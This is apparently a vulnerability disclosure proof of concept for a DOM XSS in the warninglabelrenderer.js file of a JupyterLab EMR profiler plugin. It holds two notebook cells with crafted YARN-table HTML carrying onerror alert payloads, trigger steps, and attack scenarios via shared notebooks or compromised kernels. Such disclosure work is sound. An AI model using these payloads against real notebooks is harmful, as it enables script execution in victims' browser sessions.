# Bug 9 PoC - DOM XSS in warninglabelrenderer.js (Lines 119, 140)

**Type:** DOM XSS  
**Severity:** High  
**File:** `profiler-plugin/frontend/lib/warninglabelrenderer.js`  

## Vulnerability

`contentChangedHook()` fires on `cellModel.contentChanged` and reads `output.data['text/html']`
from cell outputs. If the HTML matches `hasYarnTable()` (contains 'YARN' and '.emr-proxy-link'),
it calls `saveYarnTable()` which passes the raw HTML to jQuery's `$()` at line 119:

```js
const htmlNode = $(output.data['text/html']);  // line 119
```

jQuery instantiates DOM nodes immediately, firing inline event handlers like `onerror`.
This bypasses JupyterLab's notebook trust/sanitization because the profiler plugin
processes the HTML directly rather than going through the built-in renderer.

The parsed HTML is then written back at line 140:

```js
'text/html': ['<table>' + htmlNode.html() + '</table>']  // line 140
```

## How to Trigger

1. Make sure the **profiler plugin** (`emr-profilers-plugin`) is installed and active
2. Run Cell 1 below — it outputs `text/html` containing a YARN table with an XSS payload
3. The `contentChanged` signal fires, `contentChangedHook` detects the YARN table pattern,
   and `saveYarnTable()` jQuery-parses the HTML — triggering `alert()`

**Alternative trigger:** If the profiler plugin is not installed, the cells still demonstrate
the exact payload that would be processed. In a real scenario, the malicious `text/html`
output comes from a compromised SparkMagic kernel response or shared notebook.

In [ ]:
from IPython.display import display, HTML

# Craft a text/html output that matches hasYarnTable():
#   - Contains 'YARN' (at position > 0)
#   - Contains '.emr-proxy-link' pattern (at position > 0)
# The <img src=x onerror=...> fires when jQuery parses it at line 119.

payload = (
    '<table>'
    '<tr><th>YARN Application ID</th><th>Kind</th><th>State</th>'
    '<th>Spark UI</th><th>Driver log</th></tr>'
    '<tr>'
    '<td>application_1234567890123_0001</td>'
    '<td>spark</td>'
    '<td>idle</td>'
    '<td><a class="emr-proxy-link" href="#" '
    'emr-resource="j-XSSTEST" '
    'application-id="application_1234567890123_0001">Spark UI</a></td>'
    '<td><a href="#">Link</a></td>'
    '</tr></table>'
    '<img src=x onerror="alert(\'Bug9-XSS-line119-jQuery-parse\')">' 
)

display(HTML(payload))

In [ ]:
from IPython.display import display, HTML

# Variant 2: XSS payload inside the .emr-proxy-link anchor.
# After jQuery parses at line 119, saveYarnTable() reconstructs via
# htmlNode.html() at line 140 and writes it back with output.setData().
# The malicious HTML persists in the cell output, re-triggering on
# every subsequent contentChanged event.

payload2 = (
    '<table>'
    '<tr><th>YARN Application ID</th><th>Kind</th><th>State</th>'
    '<th>Spark UI</th><th>Driver log</th></tr>'
    '<tr>'
    '<td>application_9876543210987_0002</td>'
    '<td>pyspark</td>'
    '<td>idle</td>'
    '<td><a class="emr-proxy-link" href="#" '
    'emr-resource="j-XSSTEST2" '
    'application-id="application_9876543210987_0002">'
    '<img src=x onerror="alert(\'Bug9-XSS-line140-persisted\')">' 
    'Spark UI</a></td>'
    '<td><a href="#">Link</a></td>'
    '</tr></table>'
)

display(HTML(payload2))

## What Happens

1. Running the cells above emits `text/html` output via `display(HTML(...))`
2. The profiler plugin's `contentChangedHook` fires on the `contentChanged` signal
3. `hasYarnTable()` matches — the HTML contains both `'YARN'` and `'.emr-proxy-link'`
4. `saveYarnTable()` calls `$(output.data['text/html'])` (line 119)
5. jQuery parses the HTML string into DOM nodes, including `<img src=x>`
6. The browser tries to load `src=x`, fails, and fires the `onerror` handler → **XSS**
7. At line 140, `htmlNode.html()` writes the (still-malicious) HTML back into the output

### Attack Scenarios

- **Shared notebook:** Attacker shares a `.ipynb` file with pre-populated `text/html`
  outputs containing the payload. Any edit to the cell triggers it.
- **Compromised kernel:** A malicious SparkMagic kernel returns crafted YARN table HTML.
  The XSS fires immediately when the cell execution completes.
- **Notebook on shared storage:** Attacker modifies the `.ipynb` JSON directly to inject
  the payload into existing cell outputs.